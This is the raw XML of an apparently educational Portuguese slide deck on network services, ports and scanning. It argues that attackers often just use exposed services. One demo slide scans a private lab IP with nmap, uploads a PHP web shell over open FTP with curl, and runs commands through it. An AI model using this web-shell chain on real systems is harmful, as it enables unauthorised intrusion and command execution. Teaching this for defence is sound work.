            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1" dirty="0"/>
              <a:t> - Platão </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100" i="1" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100" i="1" dirty="0" err="1"/>
              <a:t>Não</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100" i="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100" i="1" dirty="0" err="1"/>
              <a:t>foi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100" i="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1100" i="1" dirty="0" err="1"/>
              <a:t>não</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="11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741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6016-BE20-CCE4-D88B-75D6D760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A162-C56A-95E9-60B3-65E77801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Scanners de Rede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608C59-7425-762C-D2A3-366EFF85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6BE1BF-4CD7-383C-D807-2B8F6A00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421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Como saber quais </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>serviços</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> de rede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oferecendo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Perguntando</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> de porta </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>em</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> porta</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Network Map</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/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sV</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sC</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> &lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>endereço_do_servidor</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&gt;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17107B-C903-1120-481F-032513E4C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772" y="3683758"/>
            <a:ext cx="3106734" cy="287325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24047C-EF3E-12F3-81CD-3874B88ED3C6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipV="1">
            <a:off x="6757060" y="4298868"/>
            <a:ext cx="1691712" cy="45126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B2A092-5FF5-CA99-5F4E-1911CF5267DE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipV="1">
            <a:off x="6757060" y="4572000"/>
            <a:ext cx="1691712" cy="17813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59B192-5F85-F141-AF2A-845A60604E45}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6757060" y="4797631"/>
            <a:ext cx="1691712" cy="4750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64491A-694D-ABFD-2E95-2A7C4AC1ED7D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6757060" y="4845132"/>
            <a:ext cx="1691712" cy="22563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BA595E-1135-DB93-4329-9D830EBEA404}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6757060" y="4892633"/>
            <a:ext cx="1691712" cy="451263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846E75-D7E7-1E88-BF8D-54FC9EFA3B9B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6757060" y="4940134"/>
            <a:ext cx="1591293" cy="76002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81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F40D-645B-8438-925C-FFE69307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3F1C-E626-B25B-796D-021C13B9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Hacker </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3600" i="1" dirty="0"/>
              <a:t>Nem Sempre </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Hackeia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24DC43-3C95-9C5F-F619-2282046C4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BB07A6-CB5B-F8E9-90E1-CD7FB7E7A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772" y="3683758"/>
            <a:ext cx="3106734" cy="287325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6A7F09-D964-DFF5-9432-4CF49803D631}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipV="1">
            <a:off x="6757060" y="4298868"/>
            <a:ext cx="1691712" cy="45126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DECEC8-C835-112E-A9D0-5C4045A69243}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipV="1">
            <a:off x="6757060" y="4572000"/>
            <a:ext cx="1691712" cy="17813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B4FF01-713E-49BF-660E-DC0A43AAFA25}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6757060" y="4797631"/>
            <a:ext cx="1691712" cy="4750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47F7FC-F2B0-D95E-578E-AA91183D4FBE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6757060" y="4845132"/>
            <a:ext cx="1691712" cy="22563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0ADF0E-D137-1E7D-031D-525EBEF10246}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6757060" y="4892633"/>
            <a:ext cx="1691712" cy="451263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051E6A-8859-23A3-7E9F-7F535F00A55F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6757060" y="4940134"/>
            <a:ext cx="1591293" cy="76002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23CCE4F-A1EA-DC1F-735D-36E885F0E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2969" y="2710765"/>
            <a:ext cx="3450916" cy="287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22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3FD2-6CB8-6E8B-61CB-F9DF9182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512F-743A-0E58-A552-7142D6DB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Hacker </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3600" i="1" dirty="0"/>
              <a:t>Nem Sempre </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Hackeia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4A1EC-739B-B8AC-470B-30256004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87F425-D772-7F5D-D6EB-DE0C2A221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49" y="1299798"/>
            <a:ext cx="2518683" cy="232939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8E68E8-907C-5947-12E6-81E5CBAED13C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipV="1">
            <a:off x="8300852" y="1814099"/>
            <a:ext cx="1691712" cy="45126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51EC01-2915-D06E-6425-2C28F8D3B657}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipV="1">
            <a:off x="8300852" y="2087231"/>
            <a:ext cx="1691712" cy="17813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95C553-BA15-8AD8-06C1-15C663A9CA80}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8300852" y="2312862"/>
            <a:ext cx="1691712" cy="4750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6C5152-96A5-B7DA-DB04-5A44C61AB368}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8300852" y="2360363"/>
            <a:ext cx="1691712" cy="22563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5FA527-F951-238F-A3E9-11791819955C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8300852" y="2407864"/>
            <a:ext cx="1691712" cy="451263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99B02-3850-C983-D4DF-C199536739F9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8300852" y="2455365"/>
            <a:ext cx="1591293" cy="760022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2E9729C-4949-CE2C-94F2-999AA4950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693" y="1198177"/>
            <a:ext cx="2349537" cy="1956238"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic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4A0E4348-34D4-7D61-8F0E-48E2B3AA5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76" y="2265361"/>
            <a:ext cx="5360493" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>As </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>vezes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acessam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disponíveis</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>! 😈</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Senhas</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Fracas</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Acessos</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>abertos</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Falta de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>monitoramento</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p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administrador</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> do 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deixou</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> o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disponível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942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9502-FD89-461F-460F-D815BDBC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8667-B16C-A01D-1D5B-AC8A0948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THE CODE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2911E2-EEC4-AE01-16F5-8FEEB365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78E2FD0-5503-48DD-5DB2-66930DE52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76" y="1690688"/>
            <a:ext cx="8692381" cy="49260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nmap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sV</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sC</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> 172.25.0.10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Clientes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> de Rede</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>mysql</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> (3306)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Browser / curl (80, 443…)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>smbclient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> -N -L //</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>ip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> (445)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>ftp (21)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Payload PHP:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>	echo '&lt;?</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>php</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> system($_GET["c"]); ?&gt;' &gt; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>shell.php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curl -T </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>shell.php</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> ftp://172.25.0.10/html/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>shell.php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curl "http://172.25.0.10/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>shell.php?c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>=id"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9907C-4947-764E-C0C8-28C633DC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50137-CC41-8E45-F84F-1B95998F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en-US" sz="3200"/>
              <a:t>CONCLUSÃO!</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="6" name="Content Placeholder 5" descr="COMO ASSIM ? (@mmmkjhgu) • Facebook">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{009880E3-30A0-35CD-E794-E7F7DE729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5" r="-2" b="-2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch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E987E9-1FC6-1424-C59A-0D7B13CED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63" y="2557587"/>
            <a:ext cx="4471381" cy="3717317"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="pt-BR" sz="1800" b="1" noProof="0" dirty="0"/>
              <a:t>Hacker</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="pt-BR" sz="1800" noProof="0" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="pt-BR" sz="1800" noProof="0" dirty="0" err="1"/>
              <a:t>Hackeia</a:t>
            </a:r>
            <a:endParaRPr lang="pt-BR" sz="1800" noProof="0" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="pt-BR" sz="1800" noProof="0" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="pt-BR" sz="1800" noProof="0" dirty="0"/>
              <a:t>Mas nem </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="pt-BR" sz="1800" dirty="0"/>
              <a:t>sempre...</a:t>
            </a:r>
            <a:endParaRPr lang="pt-BR" sz="1800" noProof="0" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="pt-BR" sz="1800" noProof="0" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="pt-BR" sz="1800" noProof="0" dirty="0"/>
              <a:t>Às vezes Hacker só acessa mesmo! </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="pt-BR" sz="3200" noProof="0" dirty="0"/>
              <a:t>🤷🏻‍♂️</a:t>
            </a:r>
            <a:endParaRPr lang="pt-BR" sz="18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E37018-010A-ED7F-F4A9-2CD9F3B48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2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673</Words>
  <Application>Microsoft Macintosh PowerPoint</Application>
  <PresentationFormat>Widescreen</PresentationFormat>
  <Paragraphs>108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Serviços de Rede</vt:lpstr>
      <vt:lpstr>Serviço de Rede</vt:lpstr>
      <vt:lpstr>Porta do Serviço de Rede</vt:lpstr>
      <vt:lpstr>Clientes de Rede</vt:lpstr>
      <vt:lpstr>Portas Populares</vt:lpstr>
      <vt:lpstr>Scanners de Rede</vt:lpstr>
      <vt:lpstr>Hacker Nem Sempre Hackeia</vt:lpstr>
      <vt:lpstr>Hacker Nem Sempre Hackeia</vt:lpstr>
      <vt:lpstr>SHOW ME THE CODE</vt:lpstr>
      <vt:lpstr>CONCLUSÃO!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</dc:creator>
  <cp:lastModifiedBy>Alan</cp:lastModifiedBy>
  <cp:revision>22</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-09-28T20:58:47Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-10-27T22:45:35Z</dcterms:modified>
</cp:coreProperties>
</file>